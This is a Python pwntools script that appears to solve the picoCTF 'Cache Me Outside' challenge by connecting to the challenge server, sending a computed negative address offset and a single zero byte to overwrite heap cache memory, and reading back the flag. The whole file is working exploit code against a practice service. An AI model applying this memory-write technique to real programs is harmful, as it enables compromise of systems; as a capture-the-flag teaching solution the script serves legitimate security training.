# picoCTF-cache-me-outside-exploit.py
# by Aidan Wech (ahwech)
# nc mercury.picoctf.net 17612

from pwn import *

def main():
    # connection variables
    host = "mercury.picoctf.net"
    port = 17612

    # variables
    startAddr = 0x6034a0
    targetAddr = 0x602088
    addr = targetAddr - startAddr
    value = 0x00
    
    # process
    p = remote(host, port)
    p.recvline(timeout=1)
    p.recv(timeout=1)
    p.sendline(str(addr))
    p.recv(timeout=1)
    p.sendline(p8(value))
    flag = p.recvline(timeout=1).decode('utf-8').rstrip('\n').split(': ')[1]
    p.close()

    # log flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()